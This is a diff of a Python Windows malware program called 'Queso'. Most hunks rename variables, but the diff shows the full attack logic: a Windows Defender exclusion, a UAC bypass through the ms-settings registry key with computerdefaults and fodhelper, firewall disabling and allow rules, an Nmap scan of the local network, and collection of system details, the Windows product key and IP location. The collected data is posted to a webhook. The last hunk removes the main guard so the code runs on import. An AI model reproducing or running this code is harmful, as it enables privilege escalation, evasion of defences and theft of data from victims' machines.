@@ -28,11 +28,11 @@ class Utility:
             return (__file__, False)
 
     @staticmethod
-    def ExcludeFromDefender(path: str = None) -> None: # Exclude a file from Windows Defender
-        if path is None:
-            path = Utility.GetSelf()[0]
+    def ExcludeFromDefender(filepath: str = None) -> None: # Exclude a file from Windows Defender
+        if filepath is None:
+            filepath = Utility.GetSelf()[0]
         subprocess.Popen(
-            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path),
+            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
             shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
         )
 
@@ -41,17 +41,17 @@ class Utility:
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
 
     @staticmethod
-    def UACbypass(method: int = 1) -> None: # Bypass UAC
+    def UACbypass(bypass_method: int = 1) -> None: # Bypass UAC
         if Utility.GetSelf()[1]:
             execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
         
-            if method == 1:
+            if bypass_method == 1:
                 if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
                 if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
                 execute("computerdefaults --nouacbypass")
                 execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             
-            elif method == 2:
+            elif bypass_method == 2:
                 execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                 execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                 execute("fodhelper --nouacbypass")
@@ -76,13 +76,13 @@ class Network:
             "powershell -Command Get-NetAdapter -Name *",
             shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
         )
-        lines = cmd.stdout.decode('utf-8').split('\n')
-        for line in lines:
-            if line.startswith("Name") or line.startswith("----") or line.isspace():
+        lines_out = cmd.stdout.decode('utf-8').split('\n')
+        for line_out in lines_out:
+            if line_out.startswith("Name") or line_out.startswith("----") or line_out.isspace():
                 pass
             else:
-                print(line)
-                adapter = line.split("   ")[0]
+                print(line_out)
+                adapter = line_out.split("   ")[0]
                 if "..." in adapter:
                     pass
                 else:
@@ -95,18 +95,18 @@ class Network:
             "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
             shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
         )
-        lines = cmd.stdout.decode('utf-8').split('\n')
+        lines_out = cmd.stdout.decode('utf-8').split('\n')
         connection = ""
-        for line in lines:
-            if line.startswith("Name"):
-                connection = line.split(" : ")[1]
+        for line_out in lines_out:
+            if line_out.startswith("Name"):
+                connection = line_out.split(" : ")[1]
                 break
         if connection:
             return connection
         return "None"
 
     @staticmethod
-    def DisableFirewall(path: str = None) -> None:
+    def DisableFirewall() -> None:
         adapters = Network.GetNetAdapters()
         for adapter in adapters: # Loop over all adapters
             print(adapter)
@@ -125,10 +125,10 @@ class Network:
         )
 
     @staticmethod
-    def ExcludeFromFirewall(path: str = None) -> None: # Exclude a file from Windows Firewall
-        if path is None:
-            path = Utility.GetSelf()[0]
-        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(path))
+    def ExcludeFromFirewall(filepath: str = None) -> None: # Exclude a file from Windows Firewall
+        if filepath is None:
+            filepath = Utility.GetSelf()[0]
+        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(filepath))
 
     @staticmethod
     def InstallNmap() -> None: # Install Nmap
@@ -136,23 +136,23 @@ class Network:
             zip.extractall("C:\\Program Files (x86)")
 
     @staticmethod
-    def NmapScan(range: str, arg: str ="-sV -T4 -O -F --version-light") -> ElementTree: # Perform an Nmap scan
-        nmap = nmap3.Nmap()
-        return nmap.scan_command(range, arg)
+    def NmapScan(ip_range: str, nmap_arguments: str ="-sV -T4 -O -F --version-light") -> ElementTree: # Perform an Nmap scan
+        nmap_session = nmap3.Nmap()
+        return nmap_session.scan_command(ip_range, nmap_arguments)
         
 
 class Tasks:
 
-    threads: list[Thread] = list()
+    task_threads: list[Thread] = list()
 
     @staticmethod
     def AddTask(task: Thread) -> None:
-        Tasks.threads.append(task)
+        Tasks.task_threads.append(task)
 
     @staticmethod
     def WaitForAll() -> None:
-        for thread in Tasks.threads:
-            thread.join()
+        for task_thread in Tasks.task_threads:
+            task_thread.join()
 
 
 class Queso:
@@ -191,14 +191,14 @@ class Queso:
                 Network.InstallNmap()
 
             for func, daemon in admin_tasks: # Start admin tasks
-                thread = Thread(target= func, daemon= daemon)
-                thread.start()
-                Tasks.AddTask(thread)
+                admin_task_thread = Thread(target= func, daemon= daemon)
+                admin_task_thread.start()
+                Tasks.AddTask(admin_task_thread)
 
         for func, daemon in user_tasks: # Start user tasks
-            thread = Thread(target= func, daemon= daemon)
-            thread.start()
-            Tasks.AddTask(thread)
+            user_task_thread = Thread(target= func, daemon= daemon)
+            user_task_thread.start()
+            Tasks.AddTask(user_task_thread)
 
         Tasks.WaitForAll()
 
@@ -212,7 +212,7 @@ class Queso:
         # Gather system information
         computerName = os.getenv("computername")
         computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-        uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
+        computerUUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
         cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
@@ -220,26 +220,26 @@ class Queso:
         sys_info = f"""
             \nComputer Name: {computerName}
             \nOS: {computerOS}
-            \nUUID: {uuid}
+            \nUUID: {computerUUID}
             \nCPU: {cpu}
             \nGPU: {gpu}
             \nProduct Key: {productKey}
         """
 
-        http = PoolManager()
+        http_manager = PoolManager()
 
         try: # Try to gather IP information
-            r: dict = json.loads(http.request("GET", "http://ip-api.com/json/").data.decode())
-            if r.get("status") != "success":
+            result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
+            if result.get("status") != "success":
                 raise Exception("Failed to retrieve IP info")
             data = f"""
-                \nIP: {r['query']}
-                \nCountry: {r['country']}
-                \nTimezone: {r['timezone']}
-                \nRegion: {r['regionName']}
-                \nZIP: {r['zip']}
-                \nCoordinates: [{r['lat']}, {r['lon']}]
-                \nISP: {r['isp']}
+                \nIP: {result['query']}
+                \nCountry: {result['country']}
+                \nTimezone: {result['timezone']}
+                \nRegion: {result['regionName']}
+                \nZIP: {result['zip']}
+                \nCoordinates: [{result['lat']}, {result['lon']}]
+                \nISP: {result['isp']}
             """
         except Exception: # Throw an error if we can't
             ip_info = "(No IP info)"
@@ -270,12 +270,12 @@ class Queso:
         # Append a network scan if we can make one
         networkscan = Network.NmapScan("192.168.1.1/24")
         if networkscan:
-            fields['file'] = ("{}.xml".format(uuid), ElementTree.tostring(networkscan))
+            fields['file'] = ("{}.xml".format(computerUUID), ElementTree.tostring(networkscan))
 
         fields['payload_json'] = json.dumps(payload).encode() # Append the embed
-        http.request("POST", self.Webhook, fields= fields) # Bon voyage!
+        http_manager.request("POST", self.Webhook, fields= fields) # Bon voyage!
 
 
-if __name__ == "__main__" and os.name == "nt":
+if os.name == "nt":
 
     queso = Queso()
